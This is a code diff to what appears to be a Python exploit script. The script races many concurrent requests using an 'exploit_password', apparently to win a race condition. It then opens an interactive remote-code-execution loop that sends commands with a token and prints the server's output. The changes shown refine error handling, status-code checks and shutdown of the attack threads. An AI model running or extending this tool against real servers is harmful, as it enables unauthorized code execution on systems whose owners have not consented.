@@ -89,11 +89,10 @@ def monitor_threads(request_amount: int):
         try:
             results = thread_results.copy()
             completed = len(results)
+            valid_results = [r for r in results if isinstance(r, dict)]
 
-            if completed:
-                valid_results = [r for r in results if isinstance(r, dict)]
+            if completed and len(valid_results) != 0:
                 latencies = [r["elapsed"] for r in valid_results]
-
                 latency_avg = statistics.mean(latencies) * 1000
                 latency_max = max(latencies) * 1000
 
@@ -146,16 +145,18 @@ def interative(token: str, target: str, timeout: int):
                 timeout=timeout
             )
             rce_json = rce.json()
-            output = rce_json.get("output")
-            if output != "":
-                print(output)
-            elif rce.status_code == 401:
+            output = rce_json.get("output", "")
+            if rce.status_code == 401:
                 print("[!] Token expired.")
                 return
             elif rce.status_code == 500:
                 print("[!] Internal server error.")
             else:
                 print(f"[-] Unknown error: {rce.status_code}")
+
+            if output != "":
+                print(output)
+            
         except KeyboardInterrupt:
             break
         except Exception as e:
@@ -240,18 +241,21 @@ def main(args):
     t.start()
     try:
         with ThreadPoolExecutor(max_workers=concurrency) as pool:
-            futures = [
-                pool.submit(race_worker, exploit_password, timeout)
-                for _ in range(request_amount)
-            ]
+            try:
+                futures = [
+                    pool.submit(race_worker, exploit_password, timeout)
+                    for _ in range(request_amount)
+                ]
 
-            for future in as_completed(futures):
-                thread_results.append(future.result())
-
-    except KeyboardInterrupt:
-        MONITOR_STOP.set()
+                for future in as_completed(futures):
+                    thread_results.append(future.result())
+            except KeyboardInterrupt:
+                print("\n\n[*] Shutdown requested.")
+                MONITOR_STOP.set()
+                pool.shutdown(wait=False, cancel_futures=True)
 
     finally:
+        pool.shutdown(wait=False, cancel_futures=True)
         MONITOR_STOP.set()
         t.join()
 
@@ -259,7 +263,7 @@ def main(args):
 
     print()
 
-    print(f"\n[+] Completed in {wall:.2f}s")
+    print(f"[+] Completed in {wall:.2f}s")
 
     init_false = 0
     for r in thread_results.copy():
